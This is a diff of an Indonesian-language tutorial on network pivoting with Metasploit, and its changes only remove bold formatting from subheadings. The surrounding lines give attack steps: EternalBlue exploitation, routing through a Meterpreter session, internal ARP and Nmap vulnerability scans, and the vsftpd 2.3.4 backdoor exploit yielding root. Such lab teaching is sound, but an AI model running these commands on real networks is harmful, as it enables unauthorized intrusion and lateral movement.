@@ -18,7 +18,7 @@ Ada dua jenis pivoting:
 
 ### 1. Dapatkan Akses ke Mesin Pertama
 
-   **Contoh:**
+   Contoh:
 
    ```
    use exploit/windows/smb/ms17_010_eternalblue
@@ -50,7 +50,7 @@ Ada dua jenis pivoting:
    run autoroute -s 192.168.1.0/24
    ```
 
-   **Keterangan:**  
+   Keterangan:
     - `-s`: (subnet) jaringan internal target: `192.168.1.0/24`
 
    Hasil output-nya seperti ini:
@@ -64,14 +64,14 @@ Ada dua jenis pivoting:
    [*] Use the -p option to list all active routes
    ```
 
-   **Atau Secara Manual:**
+   Atau Secara Manual:
  
    ```
    background
    route add 192.168.1.0 255.255.255.0 4
    ```
 
-   **Keterangan:**  
+   Keterangan:
    - `192.168.1.0`: Alamat IP Network target
    - `192.168.1.255`: Alamat IP Broadcast target
    - Angka `4`: Sesi ID Meterpreter.
@@ -95,7 +95,7 @@ Ada dua jenis pivoting:
    msf6 auxiliary(scanner/discovery/arp_sweep) > 
    ```
 
-   **Cek Route yang Sudah Ada:**
+   Cek Route yang Sudah Ada:
 
    ```
    route print
@@ -120,7 +120,7 @@ Ada dua jenis pivoting:
 
    Kamu sekarang bisa melakukan scanning ke internal network.
 
-   **Contoh scanning semua host yang ada di internal:**
+   Contoh scanning semua host yang ada di internal:
 
    ```
    use auxiliary/scanner/discovery/arp_sweep
@@ -162,13 +162,13 @@ Ada dua jenis pivoting:
    - `192.168.1.47`
    - `192.168.1.45`
 
-   **Buat file `host.txt`:**
+   Buat file `host.txt`:
 
    ```
    nano host.txt
    ```
 
-   **Isi dengan:**
+   Isi dengan:
 
    ```
    192.168.1.1
@@ -182,13 +182,13 @@ Ada dua jenis pivoting:
 
    Kenapa host dengan alamat IP Address `192.168.1.45` tidak diikutsertakan? karena host tersebut sudah dieksploitasi alias sudah menjadi jembatan pertama untuk mengeksploitasi host-host yang lain.
 
-   **Scan host-host tersebut menggunakan `Nmap`:**
+   Scan host-host tersebut menggunakan `Nmap`:
 
    ```
    nmap -sS -sV -T4 -O --script vuln -iL host.txt
    ```
 
-   **Keterangan:**
+   Keterangan:
    - `-sS`: Menggunakan teknik `SYN` scan (stealth)
    - `-sV`: Mengaktifkan scan versi pada service yang discan
    - `-T4`: Templat waktu (semakin tinggi semakin cepat)
@@ -283,13 +283,13 @@ Ada dua jenis pivoting:
 
    Dari hasil tersebut ditemukan exploit `VSFTPD v2.3.4 Backdoor Command Execution` dengan nama modul `exploit/unix/ftp/vsftpd_234_backdoor`.
 
-   **Gunakan Modul Tersebut:**
+   Gunakan Modul Tersebut:
 
    ```
    use exploit/unix/ftp/vsftpd_234_backdoor
    ```
 
-   **Atau bisa dengan:**
+   Atau bisa dengan:
 
    ```
    use 0
@@ -297,7 +297,7 @@ Ada dua jenis pivoting:
 
    > Angka `0` itu ID dari modul Metasploit.
 
-   **Lihat Opsi Konfigurasi:**
+   Lihat Opsi Konfigurasi:
 
    ```
    show options
@@ -330,7 +330,7 @@ Ada dua jenis pivoting:
    View the full module info with the info, or info -d command.
    ```
 
-   **Setting Target:**
+   Setting Target:
 
    ```
    set PAYLOAD cmd/unix/interact
@@ -339,7 +339,7 @@ Ada dua jenis pivoting:
    set verbose true
    ```
 
-   **Jalankan Exploit:**
+   Jalankan Exploit:
 
    ```
    exploit
@@ -367,7 +367,7 @@ Ada dua jenis pivoting:
 
    Itu artinya exploit kita terhadap service `FTP` dengan versi `vsftpd 2.3.4` berhasil dilakukan. dan kita bisa melakukan apa saja di dalam mesin target.
 
-   **Contohnya:**
+   Contohnya:
 
    Menampilkan nama user yang sedang aktif pada sesi ini:
   
@@ -387,7 +387,6 @@ Ada dua jenis pivoting:
    Dari hasil `whoami`, user yang aktif pada sesi ini adalah user `root`.
 
 ### Tips Tambahan
-
 - Gunakan `arp` di Meterpreter untuk melihat host yang pernah diakses:
 
    ```
